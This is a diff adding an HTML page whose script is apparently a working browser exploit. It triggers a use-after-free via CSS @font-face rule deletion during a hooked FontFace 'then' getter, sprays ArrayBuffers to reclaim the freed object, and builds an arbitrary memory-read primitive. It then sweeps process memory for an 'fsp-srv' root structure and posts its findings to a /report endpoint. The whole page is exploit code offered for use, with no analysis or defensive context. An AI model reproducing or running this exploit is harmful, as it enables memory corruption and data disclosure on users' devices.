@@ -1,0 +1,86 @@
+<!doctype html><html><body style="margin:0;padding:10px;font-family:system-ui;background:#07090d;color:#cfe3ff">
+<button id="go" style="font-size:20px;padding:10px 22px;border-radius:10px">SWEEP</button>
+<pre id="o" style="font:12px/1.4 ui-monospace;white-space:pre-wrap;margin-top:8px"></pre>
+<script>
+var L=[],o=document.getElementById("o");
+function lg(s){o.textContent+=s+"\n";L.push(s);try{fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:L})}).catch(function(){})}catch(e){}}
+function hx(a,b){return "0x"+("00000000"+(b>>>0).toString(16)).slice(-8)+("00000000"+(a>>>0).toString(16)).slice(-8)}
+var S=0xb8,F=0x28,FZ=0x30,FC=0x34,ST=0x7a;
+async function uaf(){
+ var n=0xb0,ab=[],ft=null,fa=null,st=document.createElement("style");
+ var r1="@font-face{font-family:s;src:local(systemfont);unicode-range:U+0043}";
+ var r2="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042}";
+ var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
+ document.fonts.add(A);void A.loaded;document.head.append(st);
+ for(var i=0;i<n/4;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ var u=st.sheet.cssRules.length;st.sheet.insertRule(r2,st.sheet.cssRules.length);
+ for(var i=n/4;i<n;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ void document.body.offsetHeight;
+ var ot=FontFace.prototype.then;
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+  if(this!==A)return;st.sheet.deleteRule(u);void document.body.offsetHeight;
+  for(var i=st.sheet.cssRules.length-1;i>=0;i--){if(st.sheet.cssRules[i].cssText.indexOf("s;")>=0||st.sheet.cssRules[i].cssText.indexOf("spray")>=0)st.sheet.deleteRule(i)}
+  void document.body.offsetHeight;
+  for(var i=0;i<n;i++){var b=new ArrayBuffer(S),d=new DataView(b);d.setUint32(0x58,0,true);d.setUint32(0x5c,0,true);d.setUint32(8,1,true);d.setUint8(ST,3);ab.push(b)}
+  return undefined}});
+ var fs=null;try{fs=await document.fonts.load("1em a,b","AB")}catch(e){}
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:ot});
+ if(!fs||fs.length!==2)return null;
+ for(var i=0;i<fs.length;i++)if(fs[i].unicodeRange==="U+0-10FFFF")ft=fs[i];
+ for(var i=0;i<ab.length;i++)if(new DataView(ab[i]).getUint32(8,true)===2)fa=ab[i];
+ if(!ft||!fa)return null;
+ var d=new DataView(fa);
+ function sp(o2,a,b){d.setUint32(o2,a>>>0,true);d.setUint32(o2+4,b>>>0,true)}
+ function rd(a,b,sz){var r=new ArrayBuffer(sz),v=new Uint8Array(r),i=0;while(i<sz){sp(F,(a+i)>>>0,b);d.setInt32(FZ,1,true);d.setInt32(FC,1,true);var s=ft.featureSettings;for(var j=1;j<5&&i<sz;j++)v[i++]=s.charCodeAt(j)&255}return r}
+ return {f:ft,rd:rd,ab:fa,dv:d};
+}
+async function run(){
+ lg("SWEEP-FSP "+navigator.userAgent);
+ var u=await uaf();if(!u){lg("no primitive");return}
+ var d=u.dv;
+ var ww=u.rd(d.getUint32(0x60,true),d.getUint32(0x64,true),0x80);
+ var wv=new DataView(ww.buffer||new Uint8Array(ww).buffer);
+ var Fp={lo:wv.getUint32(8,true),hi:wv.getUint32(12,true)};
+ var fw=u.rd(Fp.lo,Fp.hi,0x80); var fv=new DataView(fw.buffer||new Uint8Array(fw).buffer);
+ var Bp={lo:fv.getUint32(0x30,true),hi:fv.getUint32(0x34,true)};
+ lg("[anchor] B="+hx(Bp.lo,Bp.hi));
+ // bounded sweep around B for the fsp-srv root signature:
+ // +0x30 = small saved PID, +0x10/+0x20 = plausible cache pointers
+ var PAGE=0x1000, span=0x80000;  // 512 KiB BELOW B only (proven-mapped arena)
+ var base={lo:(Bp.lo - span)>>>0, hi:Bp.hi};
+ var hits=0;
+ for(var off=0; off<span && hits<8; off+=PAGE){
+   var a={lo:(base.lo+off)>>>0, hi:base.hi};
+   if(a.hi>0xffff||(a.hi===0&&a.lo<0x10000)) continue;
+   var buf;
+   // probe-gate: a single 4-byte read; an unmapped page reads back 0
+   try{ var probe=u.rd(a.lo,a.hi,4); if(new Uint8Array(probe).every(function(x){return x===0})) continue; }catch(e){ continue; }
+   try{ buf=u.rd(a.lo,a.hi,PAGE); }catch(e){ continue; }
+   var bv=new DataView(buf.buffer||new Uint8Array(buf).buffer);
+   for(var q=0; q+0x40<=PAGE; q+=8){
+     var pidLo=bv.getUint32(q+0x30,true), pidHi=bv.getUint32(q+0x34,true);
+     if(pidHi!==0||pidLo===0||pidLo>0xffffff) continue;
+     var p10lo=bv.getUint32(q+0x10,true), p10hi=bv.getUint32(q+0x14,true);
+     var p20lo=bv.getUint32(q+0x20,true), p20hi=bv.getUint32(q+0x24,true);
+     if(p10hi>0xffff||p20hi>0xffff) continue;
+     // chase: read the backend at +0x10 and +0x20, verify cached PIDs match
+     function small(ptrLo,ptrHi,off){
+       if(ptrHi>0xffff||(ptrHi===0&&ptrLo<0x10000))return -1;
+       var bb;try{bb=u.rd(ptrLo,ptrHi,0x40)}catch(e){return -1}
+       var dd=new DataView(bb.buffer||new Uint8Array(bb).buffer);
+       var lo=dd.getUint32(off,true),hi=dd.getUint32(off+4,true);
+       if(hi!==0||lo>0xffffff)return -1;
+       return lo;
+     }
+     var ncaPid=small(p10lo,p10hi,0x20), savePid=small(p20lo,p20hi,0x28);
+     var match=(ncaPid===pidLo||ncaPid===1)&&(savePid===pidLo||savePid===1);
+     if(!match)continue;
+     hits++;
+     lg("[HIT] root="+hx((a.lo+q)>>>0,a.hi)+" pid="+pidLo+" ncaPid="+ncaPid+" savePid="+savePid);
+   }
+ }
+ lg("[sweep] hits="+hits);
+ lg("done");
+}
+document.getElementById("go").addEventListener("click",run);run();
+</script></body></html>
